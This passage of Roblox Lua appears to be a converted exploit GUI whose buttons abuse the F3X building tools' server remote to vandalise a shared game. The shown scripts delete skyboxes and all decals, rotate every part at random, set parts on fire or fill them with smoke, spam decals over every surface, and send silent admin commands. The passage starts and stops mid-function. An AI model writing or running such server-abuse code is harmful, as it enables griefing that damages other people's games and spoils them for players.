		end
		spam(Id)
	end)
	
end;
task.spawn(C_2b);
-- StarterGui.ScreenGui.Frame.Skybox/decals.TextButton.LocalScript
local function C_2e()
local script = G2L["2e"];
	script.Parent.MouseButton1Click:Connect(function()
		local player = game.Players.LocalPlayer
		local tool
	
		for _, v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
				break
			end
		end
	
		if not tool then
			for _, v in game.ReplicatedStorage:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
					break
				end
			end
		end
	
		if not tool then
			warn("F3X SyncAPI not found!")
			return
		end
	
		local remote = tool.SyncAPI.ServerEndpoint
	
		local function _(args)
			remote:InvokeServer(unpack(args))
		end
	
		local function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {[1] = part}
			}
			_(args)
		end
	
		for _, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("BasePart") then
				local shouldDelete = false
	
				local name = v.Name:lower()
				if name == "sky" or name == "skypart" or name == "skybox" then
					shouldDelete = true
				end
	
				if v:FindFirstChildWhichIsA("SpecialMesh") then
					local mesh = v:FindFirstChildWhichIsA("SpecialMesh")
					if mesh.MeshId == "rbxassetid://111891702759441" then
						shouldDelete = true
					end
				end
	
				if shouldDelete then
					task.spawn(function()
						pcall(function()
							DestroyPart(v)
						end)
					end)
				end
			end
		end
	
	
	end)
end;
task.spawn(C_2e);
-- StarterGui.ScreenGui.Frame.Skybox/decals.TextButton.LocalScript
local function C_31()
local script = G2L["31"];
	script.Parent.MouseButton1Click:Connect(function()
		local function findBuildingTools()
			local plr = game:GetService("Players").LocalPlayer
	
			for _, tool in ipairs(plr.Character:GetChildren()) do
				if tool:IsA("Tool") and tool:FindFirstChild("SyncAPI") then
					return tool
				end
			end
	
			for _, tool in ipairs(plr.Backpack:GetChildren()) do
				if tool:IsA("Tool") and tool:FindFirstChild("SyncAPI") then
					return tool
				end
			end
	
			return nil
		end
	
		local btools = findBuildingTools()
		if not btools then
			warn("get btools u skid")
			return
		end
	
		local api = btools:FindFirstChild("SyncAPI")
		local fuckass = api and api:FindFirstChild("ServerEndpoint")
	
		if not fuckass then
			warn("get btools u skid")
			return
		end
	
		local shitass = {}
		for _, descendant in ipairs(workspace:GetDescendants()) do
			if descendant:IsA("Decal") then
				table.insert(shitass, descendant)
			end
		end
	
		if #shitass == 0 then
			warn("nodecal")
			return
		end
	
		local args = {
			"Remove",
			shitass
		}
	
		local enz, result
		if fuckass:IsA("RemoteFunction") then
			enz, result = pcall(function()
				return fuckass:InvokeServer(unpack(args))
			end)
		else
			fuckass:FireServer(unpack(args))
			enz = true
		end
	
		if enz then
			print("removed")
		else
			warn("failed")
		end
	
	end)
end;
task.spawn(C_31);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_35()
local script = G2L["35"];
	script.Parent.MouseButton1Click:Connect(function()
			
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
	
	
		function randomise()
			for i,v in game.Workspace:GetDescendants() do
				if v:IsA("BasePart") and v.Name ~= "Sky" then
					spawn(function()
						SetLocked(v,false)
						MovePart(v,v.CFrame * CFrame.Angles(math.random(0,1), math.random(0,1), math.random(0,1)))
					end)
				end
			end
		end
		randomise()
		end)
end;
task.spawn(C_35);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_37()
local script = G2L["37"];
	script.Parent.MouseButton1Click:Connect(function()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
	
		for _, v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		if not tool then
			for _, v in game.ReplicatedStorage:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
		end
	
		if not tool then
			warn("F3X tool not found!")
			return
		end
	
		local remote = tool.SyncAPI.ServerEndpoint
	
		local function invokeRemote(args)
			remote:InvokeServer(unpack(args))
		end
	
		local function AddFire(part)
			local args = {
				[1] = "CreateDecorations",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Fire"
					}
				}
			}
			invokeRemote(args)
		end
	
		local function FireParts()
			for _, v in game.Workspace:GetDescendants() do
				if v:IsA("BasePart") then
					task.spawn(function()
						AddFire(v)
					end)
				end
			end
		end
	
		FireParts()
	
	end)
end;
task.spawn(C_37);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_39()
local script = G2L["39"];
	script.Parent.MouseButton1Click:Connect(function()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
	
		for _, v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		if not tool then
			for _, v in game.ReplicatedStorage:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
		end
	
		if not tool then
			warn("F3X tool not found!")
			return
		end
	
		local remote = tool.SyncAPI.ServerEndpoint
	
		local function invokeRemote(args)
			remote:InvokeServer(unpack(args))
		end
	
		local function AddSparkles(part)
			local args = {
				[1] = "CreateDecorations",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Sparkles"
					}
				}
			}
			invokeRemote(args)
		end
	
		local function SparklesParts()
			for _, v in game.Workspace:GetDescendants() do
				if v:IsA("BasePart") then
					task.spawn(function()
						AddSparkles(v)
					end)
				end
			end
		end
	
		SparklesParts()
	
	
	end)
end;
task.spawn(C_39);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_3b()
local script = G2L["3b"];
	script.Parent.MouseButton1Click:Connect(function()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local backpack = player.Backpack
	
		local function getf3x()
			for _, v in ipairs(backpack:GetChildren()) do
				if v:FindFirstChild("SyncAPI") or v:FindFirstChildOfClass("BindableFunction") then
					return v
				end
			end
			for _, v in ipairs(char:GetChildren()) do
				if v:FindFirstChild("SyncAPI") or v:FindFirstChildOfClass("BindableFunction") then
					return v
				end
			end
	
			return nil
		end
	
		-- get all info
	
		local f3x = getf3x()
		if not f3x then
			warn("you dont have f3x skid")
		end
		local syncapi = f3x.SyncAPI
		local serverendpoint = syncapi.ServerEndpoint or syncapi:FindFirstChildOfClass("RemoteFunction") and syncapi:FindFirstChildOfClass("RemoteFunction"):FindFirstChildOfClass("Script")
	
		local function addfire(part)
			local args = {
				[1] = "CreateDecorations",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Fire"
					}
				}
			}
			serverendpoint:InvokeServer(unpack(args))
		end
	
		local function syncfire(part, size, heat)
			local args = {
				[1] = "SyncDecorate",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Fire",
						["Size"] = size,
						["Heat"] = heat
					}
				}
			}
			serverendpoint:InvokeServer(unpack(args))
		end
	
		local function fireall()
			spawn(function()
				for i, v in ipairs(Enum.NormalId:GetEnumItems()) do
					for i, parts in ipairs(workspace:GetDescendants()) do
						if parts:IsA("BasePart") and parts.Name ~= "Sky" and parts.Name ~= "Fog" or parts:IsA("UnionOperation") and parts.Name ~= "Sky"  and parts.Name ~= "Fog" then
							spawn(function()
								addfire(parts)
								syncfire(parts, 500, 500)
							end)
						end
					end
				end
			end)
		end
	
		fireall()
	
	end)
end;
task.spawn(C_3b);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_3d()
local script = G2L["3d"];
	script.Parent.Activated:Connect(function()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local backpack = player.Backpack
	
		local function getf3x()
			for _, v in ipairs(backpack:GetChildren()) do
				if v:FindFirstChild("SyncAPI") or v:FindFirstChildOfClass("BindableFunction") then
					return v
				end
			end
			for _, v in ipairs(char:GetChildren()) do
				if v:FindFirstChild("SyncAPI") or v:FindFirstChildOfClass("BindableFunction") then
					return v
				end
			end
	
			return nil
		end
	
		-- get all info
	
		local f3x = getf3x()
		if not f3x then
			warn("you dont have f3x skid")
		end
		local syncapi = f3x.SyncAPI
		local serverendpoint = syncapi.ServerEndpoint or syncapi:FindFirstChildOfClass("RemoteFunction") and syncapi:FindFirstChildOfClass("RemoteFunction"):FindFirstChildOfClass("Script")
	
		local function addsmoke(part)
			local args = {
				[1] = "CreateDecorations",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Smoke"
					}
				}
			}
			serverendpoint:InvokeServer(unpack(args))
		end
	
		local function syncsmoke(part, opacity, size, velocity)
			local args = {
				[1] = "SyncDecorate",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Smoke",
						["Opacity"] = opacity,
						["Size"] = size,
						["Velocity"] = velocity
					}
				}
			}
			serverendpoint:InvokeServer(unpack(args))
		end
	
		local function smokeall()
			spawn(function()
				for i, v in ipairs(Enum.NormalId:GetEnumItems()) do
					for i, parts in ipairs(workspace:GetDescendants()) do
						if parts:IsA("BasePart") and parts.Name ~= "Sky" and parts.Name ~= "Fog" or parts:IsA("UnionOperation") and parts.Name ~= "Sky"  and parts.Name ~= "Fog" then
							spawn(function()
								addsmoke(parts)
								syncsmoke(parts, 5000, 50000, 50000)
							end)
						end
					end
				end
			end)
		end
	
		smokeall()
	end)
	
end;
task.spawn(C_3d);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_3f()
local script = G2L["3f"];
	script.Parent.MouseButton1Click:Connect(function()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local backpack = player.Backpack
	
		local function getf3x()
			for _, v in ipairs(backpack:GetChildren()) do
				if v:FindFirstChild("SyncAPI") then
					return v
				end
			end
			for _, v in ipairs(char:GetChildren()) do
				if v:FindFirstChild("SyncAPI") then
					return v
				end
			end
	
			return nil
		end
	
		local f3x = getf3x()
		if not f3x then
			warn("you dont have f3x skid")
		end
		local syncapi = f3x.SyncAPI
		local serverendpoint = syncapi.ServerEndpoint
	
		local function name(part, stringa)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringa
			}
			serverendpoint:InvokeServer(unpack(args))
		end
	
		local function lock(part, boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			serverendpoint:InvokeServer(unpack(args))
		end
	
		-- main func
	
		local function createdecal(part, side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
			serverendpoint:InvokeServer(unpack(args))
		end
		local function setdecal(part, asset, side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			serverendpoint:InvokeServer(unpack(args))
		end
	
		local function color(part, color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			serverendpoint:InvokeServer(unpack(args))
		end
	
		local function addfire(part)
			local args = {
				[1] = "CreateDecorations",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Fire"
					}
				}
			}
			serverendpoint:InvokeServer(unpack(args))
		end
	
		local function syncfire(part, size, heat)
			local args = {
				[1] = "SyncDecorate",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Fire",
						["Size"] = 30,
						["Heat"] = 35
					}
				}
			}
			serverendpoint:InvokeServer(unpack(args))
		end
	
		local function addlight(part, brightness)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "PointLight"
					}
				}
			}
			serverendpoint:InvokeServer(unpack(args))
		end
	
		local function synclight(part, brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "PointLight",
						["Brightness"] = brightness,
						["Color"] = Color3.new(1, 0, 0)
					}
				}
			}
			serverendpoint:InvokeServer(unpack(args))
		end
	
		local function setcollision(part, booleana)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = booleana
					}
				}
			}
			serverendpoint:InvokeServer(unpack(args))
		end
	
		local function decalspam()
			local decalid = "96757457442198"
			for _, v in ipairs(workspace:GetDescendants()) do
				if v.Name == "Sky" then
					print("no")
				elseif v:IsA("BasePart") or v:IsA("UnionOperation") then
					spawn(function()
						createdecal(v, Enum.NormalId.Front)
						createdecal(v, Enum.NormalId.Back)
						createdecal(v, Enum.NormalId.Left)
						createdecal(v, Enum.NormalId.Right)
						createdecal(v, Enum.NormalId.Bottom)
						createdecal(v, Enum.NormalId.Top)
	
						setdecal(v, decalid, Enum.NormalId.Front)
						setdecal(v, decalid, Enum.NormalId.Back)
						setdecal(v, decalid, Enum.NormalId.Left)
						setdecal(v, decalid, Enum.NormalId.Right)
						setdecal(v, decalid, Enum.NormalId.Bottom)
						setdecal(v, decalid, Enum.NormalId.Top)
					end)
				end
			end
		end
	
		local function lightall()
			for _, v in ipairs(workspace:GetDescendants()) do
				if v:IsA("BasePart") or v:IsA("UnionOperation") then
					spawn(function()
						addlight(v)
						synclight(v, 15)
					end)
				end
			end
		end
	
		local function colorall()
			for _, v in ipairs(workspace:GetDescendants()) do
				if v:IsA("BasePart") or v:IsA("UnionOperation") then
					spawn(function()
						color(v, Color3.new(0.0666667, 0.0666667, 0.0666667))
					end)
				end
			end
		end
	
		local function fireall()
			for _, v in ipairs(workspace:GetDescendants()) do
				if v:IsA("BasePart") or v:IsA("UnionOperation") then
					spawn(function()
						addfire(v)
						syncfire(v)
					end)
				end
			end
		end
	
		local function sixsixsix()
			fireall()
			decalspam()
			colorall()
			lightall()
		end
	
		sixsixsix()
	
	end)
end;
task.spawn(C_3f);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_41()
local script = G2L["41"];
	script.Parent.MouseButton1Click:Connect(function()
		local Players = game:GetService("Players")
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RunService = game:GetService("RunService")
		local player = Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()
	
	
		local tool
	
		local function findSyncAPITool()
			for _, v in pairs(player:GetDescendants()) do
				if v.Name == "SyncAPI" then
					return v.Parent
				end
			end
			for _, v in pairs(ReplicatedStorage:GetDescendants()) do
				if v.Name == "SyncAPI" then
					return v.Parent
				end
			end
		end
	
		tool = findSyncAPITool()
		if not tool then
			warn("SyncAPI tool not found!")
			return
		end
	
	
		local remote = tool.SyncAPI.ServerEndpoint
		local function invoke(args)
			remote:InvokeServer(unpack(args))
		end
	
	
		local function SetCollision(part, boolean)
			invoke({ "SyncCollision", { { Part = part, CanCollide = boolean } } })
		end
	
		local function SetAnchor(part, boolean)
			invoke({ "SyncAnchor", { { Part = part, Anchored = boolean } } })
		end
	
		local function CreatePart(cf, parent)
			invoke({ "CreatePart", "Normal", cf, parent })
		end
	
		local function DestroyPart(part)
			invoke({ "Remove", { part } })
		end
	
		local function MovePart(part, cf)
			invoke({ "SyncMove", { { Part = part, CFrame = cf } } })
		end
	
		local function Resize(part, size, cf)
			invoke({ "SyncResize", { { Part = part, Size = size, CFrame = cf } } })
		end
	
		local function AddMesh(part)
			invoke({ "CreateMeshes", { { Part = part } } })
		end
	
		local function SetMesh(part, meshId)
			invoke({ "SyncMesh", { { Part = part, MeshId = "rbxassetid://" .. meshId } } })
		end
	
		local function SetTexture(part, texId)
			invoke({ "SyncMesh", { { Part = part, TextureId = "rbxassetid://" .. texId } } })
		end
	
		local function SetName(part, name)
			invoke({ "SetName", { part }, name })
		end
	
		local function MeshResize(part, size)
			invoke({ "SyncMesh", { { Part = part, Scale = size } } })
		end
	
		local function Weld(part1, part2, lead)
			invoke({ "CreateWelds", { part1, part2 }, lead })
		end
	
		local function SetLocked(part, boolean)
			invoke({ "SetLocked", { part }, boolean })
		end
	
		local function SetTransparency(part, transparency)
			invoke({ "SyncMaterial", { { Part = part, Transparency = transparency } } })
		end
	
	
		local function CreateSpotlight(part)
			invoke({ "CreateLights", { { Part = part, LightType = "SpotLight" } } })
		end
	
		local function SyncLighting(part, brightness)
			invoke({ "SyncLighting", { { Part = part, LightType = "SpotLight", Brightness = brightness } } })
		end
	
		local function SetColor(part, color)
			invoke({ "SyncColor", { { Part = part, Color = color, UnionColoring = false } } })
		end
	
	
		local function SpawnDecal(part, face)
			invoke({ "CreateTextures", { { Part = part, Face = face, TextureType = "Decal" } } })
		end
	
		local function AddDecal(part, assetId, face)
			invoke({ "SyncTexture", { { Part = part, Face = face, TextureType = "Decal", Texture = "rbxassetid://" .. assetId } } })
		end
	
	
		local function SpamDecal(assetId)
			for _, v in pairs(workspace:GetDescendants()) do
				if v:IsA("BasePart") then
					spawn(function()
						SetLocked(v, false)
						for _, face in pairs(Enum.NormalId:GetEnumItems()) do
							SpawnDecal(v, face)
							AddDecal(v, assetId, face)
						end
					end)
				end
			end
		end
	
		SpamDecal("127984827768386")
	
	
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local rq = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
		function reflect(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Reflectance"] = int
					}
				}
			}
			_(args)
		end
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function MeshColor(part,color)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["VertexColor"] = color
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
	
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function Setmate(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Material"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function Sky(id)
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
	
	
			local function findBuildingTools()
				local player = game:GetService("Players").LocalPlayer
	
				for _, item in ipairs(player.Character:GetChildren()) do
					if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
						return item
					end
				end
	
				for _, item in ipairs(player.Backpack:GetChildren()) do
					if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
						return item
					end
				end
	
				return nil
			end
			local buildingTools = findBuildingTools()
			if not buildingTools then
				warn("btools not found")
				return
			end
	
			local syncAPI        = buildingTools:FindFirstChild("SyncAPI")
			local serverEndpoint = syncAPI and syncAPI:FindFirstChild("ServerEndpoint")
	
			if not serverEndpoint then
				warn("btools not found")
				return
			end
	
			local skyInstance = workspace.Terrain:FindFirstChild("Sky") or workspace:FindFirstChild("Sky")
			if not skyInstance then
	
				print"ok"
			end
			spawn(function()
				DestroyPart(skyInstance)
			end)
			local success, result
			if serverEndpoint:IsA("RemoteFunction") then
				success, result = pcall(function()
					return serverEndpoint:InvokeServer(unpack(args))
				end)
			else
	
				serverEndpoint:FireServer(unpack(args))
				success = true
			end
	
			if success then
	
				print"yay"
	
			end
			e = char.HumanoidRootPart.CFrame.x
			f = char.HumanoidRootPart.CFrame.y
			g = char.HumanoidRootPart.CFrame.z
			mhm = CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,-5,0)
			v = remote:InvokeServer("CreatePart","Normal",mhm,workspace.Terrain)
			spawn(function()
				rq:InvokeServer(";unfog ;fogcolor black ;time 6")
			end)
			spawn(function()
				SetName(v,"Skybox")
			end)
			spawn(function()
				AddMesh(v)
			end)
			spawn(function()
				SetMesh(v,"111891702759441")
			end)
			spawn(function()
				MeshColor(v,vector.create(4.5,4.5,4.5))
			end)
			spawn(function()
				SetTexture(v,id)
			end)
			spawn(function()
				MeshResize(v,Vector3.new(100000,100000,100000))
			end)
			spawn(function()
				SetLocked(v,true)
			end)
		end
		Sky("119318720422874")
	
	
	
		local player = game.Players.LocalPlayer
		local char = player.Character or player.CharacterAdded:Wait()
		local tool
	
		for i, v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		for i, v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		local remote = tool.SyncAPI.ServerEndpoint
	
		function _(args)
			remote:InvokeServer(unpack(args))
		end
	
		function SetCollision(part, boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
	
		function SetAnchor(boolean, part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
	
		function CreatePart(cf, parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
	
		function Resize(part, size, cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
	
		function MovePart(part, cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
	
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part, meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://" .. meshid
					}
				}
			}
			_(args)
		end
	
		local function delete(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			remote:InvokeServer(unpack(args))
		end
	
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://" .. texid
					}
				}
			}
			_(args)
		end
	
		function SetTrans(part, int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
	
		function MeshResize(part, size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
	
		function SpawnDecal(part, side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
			_(args)
		end
	
		function AddDecal(part, asset, side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
			_(args)
		end
	
		local function particle()
			while true do
